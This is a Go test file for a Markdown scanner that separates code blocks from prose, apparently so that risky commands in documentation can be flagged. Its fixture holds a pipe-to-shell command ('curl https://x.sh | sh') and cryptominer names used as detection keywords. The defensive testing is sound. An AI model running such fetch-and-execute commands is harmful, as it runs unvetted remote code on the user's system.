package scan

import "testing"

const sampleMarkdown = "# Title\n" + // 1
	"\n" + // 2
	"Prose mentioning curl|bash in a sentence.\n" + // 3
	"\n" + // 4
	"| Check | Description |\n" + // 5  table = prose
	"| crypto | Coinhive xmrig |\n" + // 6  table = prose
	"\n" + // 7
	"```bash\n" + // 8  fence open
	"curl https://x.sh | sh\n" + // 9  fenced code
	"```\n" + // 10 fence close
	"\n" + // 11
	"    indented secret line\n" + // 12 indented code
	"\n" + // 13
	"more prose\n" // 14

func TestCodeBlockLines(t *testing.T) {
	got := CodeBlockLines([]byte(sampleMarkdown))
	codeLines := []int{8, 9, 10, 12}
	proseLines := []int{1, 3, 5, 6, 14}

	for _, ln := range codeLines {
		if !got[ln] {
			t.Errorf("line %d should be code block", ln)
		}
	}
	for _, ln := range proseLines {
		if got[ln] {
			t.Errorf("line %d should be prose, classified as code", ln)
		}
	}
}

func TestCodeBlockOnly(t *testing.T) {
	out := string(CodeBlockOnly([]byte(sampleMarkdown)))
	if !contains(out, "curl https://x.sh | sh") {
		t.Error("fenced code content should be retained")
	}
	if !contains(out, "indented secret line") {
		t.Error("indented code content should be retained")
	}
	if contains(out, "Coinhive xmrig") {
		t.Error("table-cell prose should be blanked")
	}
	if contains(out, "curl|bash in a sentence") {
		t.Error("paragraph prose should be blanked")
	}
}

func TestIsMarkdown(t *testing.T) {
	for _, p := range []string{"README.md", "docs/X.MARKDOWN", "a/b.md"} {
		if !IsMarkdown(p) {
			t.Errorf("%q should be markdown", p)
		}
	}
	for _, p := range []string{"main.go", "config.yaml", "LICENSE"} {
		if IsMarkdown(p) {
			t.Errorf("%q should not be markdown", p)
		}
	}
}

func contains(haystack, needle string) bool {
	for i := 0; i+len(needle) <= len(haystack); i++ {
		if haystack[i:i+len(needle)] == needle {
			return true
		}
	}
	return false
}
